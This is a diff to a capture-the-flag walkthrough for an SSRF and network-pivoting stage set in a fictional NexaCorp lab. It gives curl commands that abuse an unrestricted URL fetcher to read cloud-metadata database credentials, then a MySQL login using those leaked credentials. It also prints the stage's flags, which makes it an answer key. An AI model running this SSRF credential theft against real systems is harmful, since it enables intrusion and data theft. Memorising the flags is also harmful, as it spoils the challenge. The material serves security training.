@@ -1,19 +1,33 @@
-# Stage 8: Core Infrastructure Breach (Network Pivoting)
+# Stage 8: Core Infrastructure Breach (Network Pivoting & SSRF)
 
 ## Overview
-- **Domain:** Network Pivoting & SSRF
+- **Domain:** Network Pivoting & Cloud Metadata SSRF
 - **Difficulty:** Hard
 - **Points:** 500
-- **Flag:** `SHADOWNET{9j_3r4_3xnl3_fl4g_JI**&H_b#4gjB^$_gh%}`
+- **Flag:** `SHADOWNET{FULL_NETWORK_BREACH_COMPLETE}`
+
+---
+
+## Architecture
+- **Entry Host:** Public perimeter gateway running URL fetcher on port `3008` (or `3000`).
+- **Database Host:** Isolated internal subnet at `192.168.100.10`, running:
+  - Internal Cloud Metadata Service (port `8080`)
+  - Internal MySQL Database (port `3306`)
 
 ---
 
 ## Exploitation Walkthrough
 
-### 1. SSRF on Entry Host
-The entry host web service exposes a URL fetcher on port `3000` (or `3008` in docker):
+### 1. Access Entry Host
 ```bash
-curl "http://<entry-host>:3000/fetch?url=http://192.168.100.10:8080/metadata/db-credentials"
+curl http://localhost:3008/
+```
+Displays the NexaCorp Internal URL Fetcher page.
+
+### 2. Discover & Exploit SSRF Vulnerability
+The `/fetch` endpoint accepts an arbitrary `url` parameter without internal IP restriction:
+```bash
+curl -s "http://localhost:3008/fetch?url=http://192.168.100.10:8080/metadata/db-credentials" | jq .
 ```
 
 Response:
@@ -25,13 +39,18 @@ Response:
 }
 ```
 
-### 2. Connect to Internal Database
-Using the credentials retrieved via SSRF (`db_user:SecurePass123` on MySQL `192.168.100.10:3306` or `192.168.100.20:3306`):
+### 3. Query All Cloud Metadata
+```bash
+curl -s "http://localhost:3008/fetch?url=http://192.168.100.10:8080/metadata/all" | jq .
+```
+
+### 4. Connect to Internal Database
+Using the credentials retrieved via SSRF (`db_user:SecurePass123` on MySQL `192.168.100.10:3306`):
 ```bash
 mysql -h 192.168.100.10 -u db_user -pSecurePass123 -D nexacorp -e "SELECT flag FROM flags WHERE challenge='final_breach';"
 ```
 
-Flag Output:
+### 5. Final Flag Output
 ```
-SHADOWNET{9j_3r4_3xnl3_fl4g_JI**&H_b#4gjB^$_gh%}
+SHADOWNET{FULL_NETWORK_BREACH_COMPLETE}
 ```
